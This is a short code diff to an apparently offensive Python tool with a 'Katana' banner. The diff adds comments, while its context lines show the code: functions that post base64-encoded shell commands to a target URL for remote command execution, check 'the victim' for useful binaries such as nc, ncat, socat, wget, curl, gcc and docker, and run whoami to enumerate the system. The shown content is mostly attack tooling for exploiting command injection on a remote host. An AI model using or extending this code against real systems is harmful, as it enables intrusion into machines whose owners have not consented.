@@ -17,6 +17,7 @@ from http.server import HTTPServer, SimpleHTTPRequestHandler
 # Linkedin: D3Ext
 # ------------------------------------
 
+# Katana banner
 global mybanner
 mybanner = '''\n              /\                               ______,....----,
 /VVVVVVVVVVVVVV|===================""""""""""""       ___,..-\'
@@ -147,6 +148,7 @@ def execCommand(url, parameter, command):
 
     r = requests.post(url, data=rce_data)
 
+# Function to check useful binaries on the victim
 def checkBinaries(url, parameter):
     raw_command = """which nmap aws nc ncat netcat nc.traditional wget curl ping gcc make gdb base64 socat python python2 python3 python2.7 python3.7 perl php ruby xterm sudo docker lxc 2>/dev/null"""
     base64command = b64encode(raw_command.encode()).decode()
@@ -158,6 +160,7 @@ def checkBinaries(url, parameter):
     r = requests.post(url, data=enum_data)
     return r.text
 
+# Function to enumerate the system
 def enumSys(url, parameter):
     raw_command = """whoami"""
     base64command = b64encode(raw_command.encode()).decode()
